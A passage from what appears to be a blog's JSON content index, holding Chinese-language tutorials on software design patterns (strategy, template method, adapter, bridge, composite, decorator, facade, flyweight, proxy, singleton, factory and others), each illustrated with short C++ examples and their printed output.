44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72  #include\u0026lt;iostream\u0026gt; // 抽象策略类 class Strategy { public: Strategy(){} virtual ~Strategy(){} virtual int calculate(int a,int b)=0; }; // 具体策略类 class Plus:public Strategy { public: Plus(){} int calculate(int a,int b)override { return a+b; } }; // 具体策略类 class Minus:public Strategy { public: Minus(){} int calculate(int a,int b)override { return a-b; } }; // 上下文类 class Context { public: Context(){} Context(int a,int b) { this-\u0026gt;a = a; this-\u0026gt;b = b; } void set(Strategy* strategy,int a,int b) { this-\u0026gt;strategy = strategy; this-\u0026gt;a = a; this-\u0026gt;b = b; } void getResulet() { std::cout\u0026lt;\u0026lt;strategy-\u0026gt;calculate(a,b)\u0026lt;\u0026lt;std::endl; } private: int a,b; Strategy* strategy; }; int main() { Context *context = new Context(); Strategy* strategy = new Plus(); context-\u0026gt;set(strategy,1,2); context-\u0026gt;getResulet(); strategy = new Minus(); context-\u0026gt;set(strategy,4,6); context-\u0026gt;getResulet(); delete context; delete strategy; }    结果：\n3 -2\n 10.模板方法模式 定义 定义一个操作中的算法的框架，而将一些步骤延迟到子类中。模板方法模式使得子类可以不改变一个算法的结构即可重定义该算法的某些特定步骤。\n模板方法基于继承与派生。\n以下以“Linux的GUI发行版”为例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57  #include \u0026lt;iostream\u0026gt;#include \u0026lt;string\u0026gt; // 基类 class Linux { public: Linux() {} virtual ~Linux() {} // 公共方法  void Kernel() { std::cout \u0026lt;\u0026lt; \u0026#34;Linux kernel load successfully.\u0026#34; \u0026lt;\u0026lt; std::endl; } virtual void GUI() = 0; void play() { Kernel(); GUI(); } private: std::string terminal; }; // 派生类 class CentOS : public Linux { public: CentOS() {} void GUI() override { std::cout \u0026lt;\u0026lt; \u0026#34;Using: CentOS style GUI\u0026#34; \u0026lt;\u0026lt; std::endl; } }; // 派生类 class Ubuntu : public Linux { public: Ubuntu() {} void GUI() override { std::cout \u0026lt;\u0026lt; \u0026#34;Using: Ubuntu style GUI\u0026#34; \u0026lt;\u0026lt; std::endl; } }; int main() { Linux *linux = new Ubuntu(); linux-\u0026gt;play(); linux = new CentOS(); linux-\u0026gt;play(); delete linux; }    结果：\nLinux kernel load successfully. Using: Ubuntu style GUI Linux kernel load successfully. Using: CentOS style GUI\n ","date":"2021-08-31T00:00:00Z","permalink":"https://ther-nullptr.github.io/posts/programming/design-pattern-2/","title":"设计模式（三）"},{"content":"1.适配器模式 定义 将一个类的接口转换成客户希望的另一个接口。适配器模式让那些接口不兼容的类可以一起工作。\n其包含适配器类（根据客户的需求，将适配者已有的接口转换成另一个接口）、适配者类（适配器包装的对象）。\n以下以“表白暗语翻译器”为例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59  #include \u0026lt;iostream\u0026gt;#include \u0026lt;string\u0026gt;#include \u0026lt;vector\u0026gt; // 原有接口 class Target { public: virtual ~Target() = default; virtual std::string Answer() const { return \u0026#34;I love you\\n\u0026#34;; } }; // 需要通过适配器处理的适配者 class Adaptee { public: std::vector\u0026lt;int\u0026gt; SpecialAnswer() const { return std::vector\u0026lt;int\u0026gt; {73,32,108,111,118,101,32,121,111,117}; } }; // 适配器，需要继承默认接口，可以处理适配者，便于使用 class Adapter:public Target { private: Adaptee *adaptee; public: Adapter(Adaptee *adaptee) : adaptee(adaptee) {} // 实现对原有数据的解析  std::string Answer() const override { std::vector\u0026lt;int\u0026gt; ciphertext = this-\u0026gt;adaptee-\u0026gt;SpecialAnswer(); std::string cleartext; for(int i:ciphertext) { cleartext += char(i); } return cleartext; } }; int main() { Target *target = new Target; Adaptee *adaptee = new Adaptee; std::cout\u0026lt;\u0026lt;\u0026#34;Target mode:\u0026#34;\u0026lt;\u0026lt;std::endl; std::cout\u0026lt;\u0026lt;target-\u0026gt;Answer(); std::cout\u0026lt;\u0026lt;\u0026#34;Adaptee mode:\u0026#34;\u0026lt;\u0026lt;std::endl; Adapter *adapter = new Adapter(adaptee); std::cout\u0026lt;\u0026lt;adapter-\u0026gt;Answer(); }    结果：\nI Love you\nI Love you\n 2.桥接模式 定义 将抽象部分与它的实现部分解耦，使得两者都能够独立变化。\n具体来说，就是抽取其中一个维度并使之成为独立的类层次，这样就可以在初始类中引用这个新层次的对象， 从而使得一个类不必拥有所有的状态和行为。\n桥接模式将两个独立变化的维度设计成两个独立的继承等级结构（而不会将两者耦合在一起形成多层继承结构），在抽象层将二者建立起一个抽象关联，该关联关系类似一座桥，将两个独立的等级结构连接起来。\n其包含抽象类、实现类接口、扩充抽象类、具体实现类。\n以下以“发行于Windows和Linux的不同游戏”为例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96  #include \u0026lt;iostream\u0026gt;#include \u0026lt;string\u0026gt;// 打个不恰当的比方，实现类相当于各式各样的软件，抽象类相当于各式各样的平台 // 实现类（接口） class Game { public: Game() {} virtual void Play() const = 0; virtual ~Game() {} }; // 具体实现类 class GameA : public Game { public: GameA() {} void Play() const override { std::cout \u0026lt;\u0026lt; \u0026#34;Play Game A\u0026#34; \u0026lt;\u0026lt; std::endl; } }; // 具体实现类 class GameB : public Game { public: GameB() {} void Play() const override { std::cout \u0026lt;\u0026lt; \u0026#34;Play Game B\u0026#34; \u0026lt;\u0026lt; std::endl; } }; // 抽象类 class OS { public: OS(){} virtual void SetupGame(Game *game) = 0; virtual void Play() = 0; virtual ~OS(){} protected: Game *game; }; // 扩充抽象类 class Windows:public OS { public: Windows(){} void SetupGame(Game *game) override { this-\u0026gt;game = game; } void Play() override { std::cout\u0026lt;\u0026lt;\u0026#34;On Windows:\u0026#34;; this-\u0026gt;game-\u0026gt;Play(); } }; // 扩充抽象类 class Linux:public OS { public: Linux(){} void SetupGame(Game *game) override { this-\u0026gt;game = game; } void Play() override { std::cout\u0026lt;\u0026lt;\u0026#34;On Linux:\u0026#34;; this-\u0026gt;game-\u0026gt;Play(); } }; int main() { Game *game; OS *os; game = new GameA(); os = new Windows(); os-\u0026gt;SetupGame(game); os-\u0026gt;Play(); game = new GameB(); os = new Linux(); os-\u0026gt;SetupGame(game); os-\u0026gt;Play(); delete game; delete os; }    结果：\nOn Windows:Play Game A On Linux:Play Game B\n 3.组合模式 组合多个对象形成树形结构以表示具有部分-整体关系的层次结构。组合模式让客户端可以统一对待单个对象和组合对象。\n由抽象构件（提供公共接口）、叶子构件、容器构件（既可包含容器构件、也可包含叶子构件）。\n以下以“电脑中的文件管理系统”为例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165  #include \u0026lt;iostream\u0026gt;#include \u0026lt;string\u0026gt;#include \u0026lt;vector\u0026gt;// 组合模式很像电脑中文件和文件夹的管理系统 // 抽象构件 class Component { public: Component() {} Component(std::string name) { this-\u0026gt;name = name; } virtual ~Component(){} // 增加、移除叶子和容器组件的操作（此处为文件和文件夹）  virtual void add(Component *){}; virtual void remove(Component *){}; virtual void getInfo() const = 0; std::string getName() { return name; } virtual int getSize() { return size; } protected: std::string name; int size; }; // 叶子构件。注意叶子构件不支持add和remove方法 class File : public Component { public: File() {} File(std::string name, int size) { this-\u0026gt;name = name; this-\u0026gt;size = size; } void getInfo() const override { std::cout \u0026lt;\u0026lt; name \u0026lt;\u0026lt; \u0026#39;:\u0026#39; \u0026lt;\u0026lt; size \u0026lt;\u0026lt; \u0026#34;KB\u0026#34; \u0026lt;\u0026lt; std::endl; } }; // 叶子构件的具体类 class CppFile : public File { public: CppFile(std::string name, int size) { this-\u0026gt;name = name; this-\u0026gt;size = size; } }; // 叶子构件的具体类 class PythonFile : public File { public: PythonFile(std::string name, int size) { this-\u0026gt;name = name; this-\u0026gt;size = size; } }; // 容器构件，利用了递归算法搜索容器内的每一个构件 class Dir : public Component { public: Dir(std::string name) { this-\u0026gt;name = name; this-\u0026gt;size = 0; } void add(Component *c) override { componentList.push_back(c); size += c-\u0026gt;getSize(); } void remove(Component *c) override { for (int i = 0; i \u0026lt; componentList.size(); i++) { if (componentList[i]-\u0026gt;getName() == c-\u0026gt;getName()) { componentList.erase(componentList.begin() + i); size -= c-\u0026gt;getSize(); break; } } } // 遍历每一个组件的长度  int getSize() override { int subsize = 0; for (int i = 0; i \u0026lt; componentList.size(); i++) { subsize += componentList[i]-\u0026gt;getSize(); } return subsize; } // 注意，允许递归搜索  void getInfo() const override { std::cout \u0026lt;\u0026lt; name \u0026lt;\u0026lt; \u0026#39;:\u0026#39; \u0026lt;\u0026lt; size \u0026lt;\u0026lt; \u0026#34;KB\u0026#34; \u0026lt;\u0026lt; std::endl; for (int i = 0; i \u0026lt; componentList.size(); i++) { ((Component *)componentList[i])-\u0026gt;getInfo(); } } private: std::vector\u0026lt;Component *\u0026gt; componentList; }; int main() { Component *root; Component *Dir1, *Dir2, *Dir3; Component *File1, *File2, *File3, *File4, *File5, *File6, *File7; root = new Dir(\u0026#34;root\u0026#34;); Dir1 = new Dir(\u0026#34;CppFiles\u0026#34;); Dir2 = new Dir(\u0026#34;PythonFiles\u0026#34;); Dir3 = new Dir(\u0026#34;CppProject\u0026#34;); File1 = new File(\u0026#34;test1.py\u0026#34;, 2); File2 = new File(\u0026#34;test2.py\u0026#34;, 10); File3 = new File(\u0026#34;test3.py\u0026#34;, 3); File4 = new File(\u0026#34;test1.cpp\u0026#34;, 2); File5 = new File(\u0026#34;test2.cpp\u0026#34;, 1); File6 = new File(\u0026#34;source.h\u0026#34;, 1); File7 = new File(\u0026#34;source.cpp\u0026#34;, 4); Dir3-\u0026gt;add(File6); Dir3-\u0026gt;add(File7); Dir1-\u0026gt;add(Dir3); Dir1-\u0026gt;add(File4); Dir1-\u0026gt;add(File5); Dir2-\u0026gt;add(File1); Dir2-\u0026gt;add(File2); Dir2-\u0026gt;add(File3); Dir2-\u0026gt;remove(File3); root-\u0026gt;add(Dir1); root-\u0026gt;add(Dir2); root-\u0026gt;add(Dir3); root-\u0026gt;getInfo(); delete root; delete Dir1; delete Dir2; delete Dir3; delete File1; delete File2; delete File3; delete File4; delete File5; delete File6; delete File7; }    结果：\nroot:25KB CppFiles:8KB CppProject:5KB source.h:1KB source.cpp:4KB test1.cpp:2KB test2.cpp:1KB PythonFiles:12KB test1.py:2KB test2.py:10KB CppProject:5KB source.h:1KB source.cpp:4KB\n 4.装饰模式 定义 动态地给一个对象增加一些额外的职责。就扩展功能而言，装饰模式提供了一种比使用子类更加灵活的替代方案。\n装饰模式是一种用于替代继承的技术。通过一种无须定义子类的方式给对象动态增加职责，使用对象之间的关联关系取代类之间的继承关系。\n由抽象构件、具体构件、抽象装饰类、具体装饰类组成。\n以下以“穿不同衣服的人”为例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91  #include\u0026lt;iostream\u0026gt;#include\u0026lt;string\u0026gt; // 抽象构件类，它是具体构件类和抽象装饰类的共同基类 class Component { public: Component() {} virtual void Operation() const = 0; virtual ~Component() {} }; // 具体构件类 class Person:public Component { public: Person(std::string name) { this-\u0026gt;name = name; } void Operation()const override { std::cout\u0026lt;\u0026lt;name\u0026lt;\u0026lt;std::endl; } private: std::string name; }; // 抽象装饰类。注意Decorator必须继承Component，这样才能实现连续装饰 class Decorator:public Component { public: Decorator(){}; Decorator(Component *c) { this-\u0026gt;component = c; } protected: // 被装饰的对象 \tComponent *component; }; // 具体装饰类 class Shirt:public Decorator { public: Shirt(Component *c) { this-\u0026gt;component = c; } void Operation()const override { component-\u0026gt;Operation(); std::cout\u0026lt;\u0026lt;\u0026#34;wear a shirt\u0026#34;\u0026lt;\u0026lt;std::endl; } }; // 具体装饰类 class Pants:public Decorator { public: Pants(Component *c) { this-\u0026gt;component = c; } void Operation()const override { component-\u0026gt;Operation(); std::cout\u0026lt;\u0026lt;\u0026#34;wear pants\u0026#34;\u0026lt;\u0026lt;std::endl; } }; int main() { Component *c; Component *shirt; Component *pants; // 注意添加装饰的过程  c= new Person(\u0026#34;Alice\u0026#34;); shirt = new Shirt(c); shirt-\u0026gt;Operation(); std::cout\u0026lt;\u0026lt;std::endl; pants = new Pants(shirt); pants-\u0026gt;Operation(); delete c; delete shirt; delete pants; }    结果：\nAlice wear a shirt\nAlice wear a shirt wear pants\n 5.外观模式 定义 为子系统中的一组接口提供一个统一的入口。外观模式定义了一个高层接口，这个接口使得这一子系统更加容易使用。\n引入了外观类，原有的复杂的引用关系都由外观类实现，不同的客户端只需要与外观类交互。\n内含外观角色和子系统角色。\n以下以“Vscode中的编辑器和终端操作”为例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71  #include\u0026lt;iostream\u0026gt;#include\u0026lt;string\u0026gt; // 在进入和退出Vscode时，我们不需要了解其内部逻辑，只需要按下按钮与GUI进行交互 // 子系统 class TextEditor { public: TextEditor(){} void open() { std::cout\u0026lt;\u0026lt;\u0026#34;open the text editor\u0026#34;\u0026lt;\u0026lt;std::endl; } void close() { std::cout\u0026lt;\u0026lt;\u0026#34;close the text editor\u0026#34;\u0026lt;\u0026lt;std::endl; } }; // 子系统 class Terminal { public: Terminal(){} void open() { std::cout\u0026lt;\u0026lt;\u0026#34;open the terminal\u0026#34;\u0026lt;\u0026lt;std::endl; } void close() { std::cout\u0026lt;\u0026lt;\u0026#34;close the terminal\u0026#34;\u0026lt;\u0026lt;std::endl; } }; // 外观系统，使用者通过调用外观系统与子系统进行交互 class Facade { public: Facade () { textEditor = new TextEditor(); terminal = new Terminal(); } ~Facade () { delete textEditor; delete terminal; } void open() { textEditor-\u0026gt;open(); terminal-\u0026gt;open(); } void close() { textEditor-\u0026gt;close(); terminal-\u0026gt;close(); } private: TextEditor* textEditor; Terminal* terminal; }; int main() { Facade *facade; facade = new Facade(); facade-\u0026gt;open(); facade-\u0026gt;close(); delete facade; }    结果：\nopen the text editor open the terminal close the text editor close the terminal\n 6.享元模式 运用共享技术有效地支持大量细粒度对象的复用。\n享元模式通过共享技术实现相同或相似的细粒度对象的复用，提供一个享元池存储已经创建好的对象，并通过享元工厂类将享元对象提供给客户端使用。\n可分为抽象享元类、具体享元类、非共享享元类和享元工厂类。\n以下以“连接路由器和以太网的电脑”为例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96  #include\u0026lt;iostream\u0026gt;#include\u0026lt;string\u0026gt;#include\u0026lt;vector\u0026gt; // 抽象享元类 class Device { public: Device(){} virtual ~Device(){} virtual std::string getName() = 0; }; // 具体享元类 class Ethernet:public Device { public: Ethernet(){} std::string getName() override { return \u0026#34;Ethernet \u0026#34;; } }; // 具体享元类 class Router:public Device { public: Router(){} std::string getName() override { return \u0026#34;Router \u0026#34;; } }; // 享元工厂，这里利用了单例模式 class Factory { public: Device* getDevice(char ch) { if (ch == \u0026#39;E\u0026#39;) { return devicePool[0]; } else if(ch == \u0026#39;R\u0026#39;) { return devicePool[1]; } return nullptr; } // 单例模式的应用  static Factory* getFactory() { if (instance == nullptr) { instance = new Factory(); } return instance; } private: Factory () { Ethernet *ethernet = new Ethernet(); Router *router = new Router(); devicePool.push_back(ethernet); devicePool.push_back(router); } static Factory* instance; std::vector\u0026lt;Device*\u0026gt; devicePool; }; Factory* Factory::instance = nullptr; int main() { Factory *factory = Factory::getFactory(); Device *device1,*device2,*device3,*device4; device1 = factory-\u0026gt;getDevice(\u0026#39;E\u0026#39;); std::cout\u0026lt;\u0026lt;device1-\u0026gt;getName()\u0026lt;\u0026lt;device1\u0026lt;\u0026lt;std::endl; device2 = factory-\u0026gt;getDevice(\u0026#39;E\u0026#39;); std::cout\u0026lt;\u0026lt;device2-\u0026gt;getName()\u0026lt;\u0026lt;device2\u0026lt;\u0026lt;std::endl; device3 = factory-\u0026gt;getDevice(\u0026#39;R\u0026#39;); std::cout\u0026lt;\u0026lt;device3-\u0026gt;getName()\u0026lt;\u0026lt;device3\u0026lt;\u0026lt;std::endl; device4 = factory-\u0026gt;getDevice(\u0026#39;R\u0026#39;); std::cout\u0026lt;\u0026lt;device4-\u0026gt;getName()\u0026lt;\u0026lt;device4\u0026lt;\u0026lt;std::endl; delete device1; delete device3; delete factory; }    结果：\n 7.代理模式 定义 给某一个对象提供一个代理或占位符，并由代理对象来控制对原对象的访问。\n代理对象可以屏蔽或删除客户不想访问的内容和服务，也可以根据客户需求增加新的内容和服务。\n可分为抽象主题、真实主题和代理主题。\n以下以“使用代理‘科学上网’”为例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59  #include\u0026lt;iostream\u0026gt;#include\u0026lt;string\u0026gt;#include\u0026lt;vector\u0026gt; // 抽象主题角色 class Subject { public: Subject(){} virtual void method() = 0; virtual ~Subject(){} }; // 具体主题角色 class RealSubject:public Subject { public: RealSubject() { } void method() override { std::cout\u0026lt;\u0026lt;\u0026#34;Log in success!\u0026#34;\u0026lt;\u0026lt;std::endl; } }; // 代理角色 class Proxy:public Subject { public: Proxy () { realSubject = new RealSubject(); } void method() override { std::cout\u0026lt;\u0026lt;\u0026#34;using Proxy...\u0026#34;\u0026lt;\u0026lt;std::endl; realSubject-\u0026gt;method(); } ~Proxy () override { delete realSubject; } private: RealSubject *realSubject; }; int main() { Subject *subject; subject = new RealSubject(); subject-\u0026gt;method(); std::cout\u0026lt;\u0026lt;std::endl; subject = new Proxy(); subject-\u0026gt;method(); delete subject; }    结果：\nLog in success!\nusing Proxy\u0026hellip; Log in success!\n ","date":"2021-08-29T00:00:00Z","permalink":"https://ther-nullptr.github.io/posts/programming/design-pattern-1/","title":"设计模式（二）"},{"content":"设计模式概论 为什么要学习设计模式 众所周知，面向对象编程（OOP）是编程中的一个重要思想。基于此，计算机学界诞生了一大批术语：类、继承、多态、虚方法等，一大批面向对象的语言C++、java、C#也开始大放异彩。\n目前大多数工科院系都开设面向对象编程（C++）课程。不少同学在学习这门课时也许会遇到和我一样的疑惑：我懂得类、继承、虚函数的使用规则，但是这样做到底有什么实在的好处呢？如果仅仅学习C++的语法，我们是不能深刻体会面向对象的优越性的，这样学到的东西只能称之为\u0026quot;C with class\u0026quot;。而要想真正理解面向对象，就需要进一步了解设计模式（相关内容只有在软件工程的相关课程中才有讲授）。\n要想从一个编程新手进阶为有一定编程思维的程序员，无法绕开两项内容：算法和设计模式。算法的重要性自不必多说，而了解设计模式，既可以让你在开发工程时更加条理、更容易与他人协作，又可以增强阅读他人所写源代码的能力。\n设计模式种类繁多，不便记忆。为了便于大家理解每一项设计模式，博主特意为每一种设计模式都配备了一个独特的例子。例如，建造者模式可以理解为“具有不同食材配比的菜谱”，而桥接模式可以理解为“在不同的操作系统上玩不同的游戏”。在实际编写代码时，也可结合对应的例子，权衡每一种设计模式的优劣。\n本人才疏学浅，若有谬误，欢迎指出!\n 说明：博客内容为博主学习设计模式时所做的笔记，例子力求精简、易于理解。在创作过程中主要参考了以下网站：\nhttps://refactoringguru.cn/ 这是一名乌克兰裔程序员亚历山大·什韦茨所创立的网站。网站详尽地解释了各个设计模式，并提供了多种面向对象编程语言的实例。不需要购买电子书，因为网站内容已经十分详尽。\nhttps://blog.csdn.net/sinat_21107433/category_9418696.html\n 设计模式的原则 所有的设计模式都遵循以下几个原则：\n 开闭原则**：**对扩展开放，对修改关闭 里氏代换原则：任何基类可以出现的地方，子类一定可以出现 依赖倒转原则：对接口编程 接口隔离原则：使用多个隔离的接口，比使用单个接口要好 迪米特法则：一个实体应当尽量少地与其他实体之间发生相互作用 合成复用原则：尽量使用合成/聚合的方式，而不是使用继承  设计模式分类  创建型模式 详见 https://blog.csdn.net/m0_51908955/article/details/119981405 结构型模式 详见 https://blog.csdn.net/m0_51908955/article/details/119981451 行为模式 详见 https://blog.csdn.net/m0_51908955/article/details/119981459  1.单例模式 定义 单例模式就是一个类只能被实例化一次 ，更准确的说是只能有一个实例化的对象的类。\n 这个类只能有一个实例（只有在指针为空时创建新对象，否则返回原有对象）； 它必须自己创建这个实例（构造函数为私有，然后通过getInstance方法间接访问）； 它必须自己向整个系统提供这个实例（getInstance为静态成员函数）。   注意：若为多线程环境，创建实例时需要用互斥锁加以保护。\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51  #include \u0026lt;iostream\u0026gt;#include \u0026lt;mutex\u0026gt;class Singleton { public: // 获取单例对象的函数，注意实例对象必须是全局的  static Singleton *getInstance(int num) { // m_mutex.lock();  if (instance == nullptr) { std::cout \u0026lt;\u0026lt; \u0026#34;new instance!\u0026#34; \u0026lt;\u0026lt; std::endl; instance = new Singleton(num); } // m_mutex.unlock();  return instance; } // 严谨起见，单例模式下对象既不能够被赋值，也不能够被复制  Singleton(Singleton \u0026amp;other) = delete; void operator=(const Singleton \u0026amp;) = delete; int getNum() const { return this-\u0026gt;num; } private: // 私有的构造函数，这里的构造函数不能直接使用  Singleton(int num) { this-\u0026gt;num = num; } // 私有字段  int num; // 静态方法，便于全局访问实例  static Singleton *instance; // static std::mutex m_mutex; }; // 初始值赋为nullptr Singleton *Singleton::instance = nullptr; // std::mutex Singleton::m_mutex;  int main() { Singleton *s1 = Singleton::getInstance(1); std::cout \u0026lt;\u0026lt; s1-\u0026gt;getNum() \u0026lt;\u0026lt; std::endl; // 此后将不再创建新的实例  Singleton *s2 = Singleton::getInstance(2); std::cout \u0026lt;\u0026lt; s2-\u0026gt;getNum() \u0026lt;\u0026lt; std::endl; }    结果：\nnew instance! 1 1\n 2.工厂模式 定义 定义一个用于创建对象的接口，但是让子类决定将哪一个类实例化。工厂方法模式让一个类的实例化延迟到其子类。\n有4种成员：抽象工厂、具体工厂、抽象产品、具体产品。\n以下以“生产手机和电脑的工厂”为例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86  #include \u0026lt;iostream\u0026gt;// 抽象产品 class AbstractProduct { public: AbstractProduct() {} virtual ~AbstractProduct() {} virtual void getInfo() const = 0; }; // 具体产品1 class Computer : public AbstractProduct { public: Computer(int price) : price(price) { getInfo(); } virtual void getInfo() const override { std::cout \u0026lt;\u0026lt; \u0026#34;computer:$\u0026#34; \u0026lt;\u0026lt; price \u0026lt;\u0026lt; std::endl; } private: int price; }; // 具体产品2 class MobilePhone : public AbstractProduct { public: MobilePhone(int price) : price(price) { getInfo(); } virtual void getInfo() const override { std::cout \u0026lt;\u0026lt; \u0026#34;mobile phone:$\u0026#34; \u0026lt;\u0026lt; price \u0026lt;\u0026lt; std::endl; } private: int price; }; // 抽象工厂 class AbstractFactory { public: virtual AbstractProduct *getProduct(int) const = 0; // 返回产品基类指针，利用多态得到不同的产品  virtual ~AbstractFactory() {} }; // 具体工厂1 // 每引入一个新的产品，就要创建一个对应的工厂（重写子类） // 若构造方法较为简单，也可将抽象工厂和具体工厂合并，用switch-case语句实现 class ComputerFactory : public AbstractFactory { public: AbstractProduct *getProduct(int price) const override { return new Computer(price); } }; // 具体工厂2 class MobilePhoneFactory : public AbstractFactory { public: AbstractProduct *getProduct(int price) const override { return new MobilePhone(price); } }; int main() { AbstractFactory *fac = nullptr; fac = new ComputerFactory(); fac-\u0026gt;getProduct(1000); delete fac; fac = new MobilePhoneFactory(); fac-\u0026gt;getProduct(500); delete fac; }    结果：\ncomputer:$1000 mobile phone:$500\n 3.抽象工厂模式 定义 提供一个创建一系列相关或相互依赖对象的接口，而无需指定他们具体的类。\n与一般工厂模式不同的是，抽象工厂模式的每一个具体工厂可以生产多种产品。这多种产品一般不属于同一个类别，但相互依存、配套、紧密相关。\n以下以“生产手机和电脑及其配套的USB的工厂”为例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142  #include \u0026lt;iostream\u0026gt;// 抽象产品类1(此处为生产电子产品本体) class AbstractProductA { public: AbstractProductA() {} virtual ~AbstractProductA() {} virtual void getInfo() const = 0; }; // 抽象产品类2(此处为生产电子产品配套的USB) class AbstractProductB { public: AbstractProductB() {} virtual ~AbstractProductB() {} virtual void getInfo() const = 0; }; // 具体产品1(属于类A) class Computer : public AbstractProductA { public: Computer(int price) : price(price) { getInfo(); } virtual void getInfo() const override { std::cout \u0026lt;\u0026lt; \u0026#34;computer:$\u0026#34; \u0026lt;\u0026lt; price \u0026lt;\u0026lt; std::endl; } private: int price; }; // 具体产品2(属于类A) class MobilePhone : public AbstractProductA { public: MobilePhone(int price) : price(price) { getInfo(); } virtual void getInfo() const override { std::cout \u0026lt;\u0026lt; \u0026#34;mobile phone:$\u0026#34; \u0026lt;\u0026lt; price \u0026lt;\u0026lt; std::endl; } private: int price; }; // 具体产品3(属于类B) class ComputerUSB :public AbstractProductB { public: ComputerUSB(int price):price(price) { getInfo(); } virtual void getInfo() const override { std::cout \u0026lt;\u0026lt; \u0026#34;computer USB:$\u0026#34; \u0026lt;\u0026lt; price \u0026lt;\u0026lt; std::endl; } private: int price; }; // 具体产品4(属于类B) class MobilePhoneUSB :public AbstractProductB { public: MobilePhoneUSB(int price):price(price) { getInfo(); } virtual void getInfo() const override { std::cout \u0026lt;\u0026lt; \u0026#34;mobile phone USB:$\u0026#34; \u0026lt;\u0026lt; price \u0026lt;\u0026lt; std::endl; } private: int price; }; // 抽象工厂 class AbstractFactory { public: virtual AbstractProductA *getProductA(int) const = 0 ; // 返回产品基类指针，利用多态得到不同的产品  virtual AbstractProductB *getProductB(int) const = 0 ; // 可以生产多个配套的产品  virtual ~AbstractFactory() {} }; // 具体工厂1 // 每引入一个新的产品，就要创建一个对应的工厂（重写子类） class ComputerFactory : public AbstractFactory { public: AbstractProductA *getProductA(int price) const override { return new Computer(price); } AbstractProductB *getProductB(int price) const override { return new ComputerUSB(price); } }; // 具体工厂2 class MobilePhoneFactory : public AbstractFactory { public: AbstractProductA *getProductA(int price) const override { return new MobilePhone(price); } AbstractProductB *getProductB(int price) const override { return new MobilePhoneUSB(price); } }; int main() { AbstractFactory *fac = nullptr; fac = new ComputerFactory(); std::cout\u0026lt;\u0026lt;\u0026#34;produce a computer:\u0026#34;\u0026lt;\u0026lt;std::endl; fac-\u0026gt;getProductA(1000); fac-\u0026gt;getProductB(50); delete fac; std::cout\u0026lt;\u0026lt;\u0026#34;produce a mobile phone:\u0026#34;\u0026lt;\u0026lt;std::endl; fac = new MobilePhoneFactory(); fac-\u0026gt;getProductA(500); fac-\u0026gt;getProductB(30); delete fac; }   4.原型模式 定义 使用原型实例指定待创建对象的类型，并且通过复制这个原型来创建新的对象。\n原型模式通过给出一个原型对象来指明所要创建的对象的类型，然后用复制这个原型对象的办法创建出更多同类型的对象。原型模式可以免于考虑浅拷贝和深拷贝。\n以下以“获取不同颜色和形状的图形”为例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 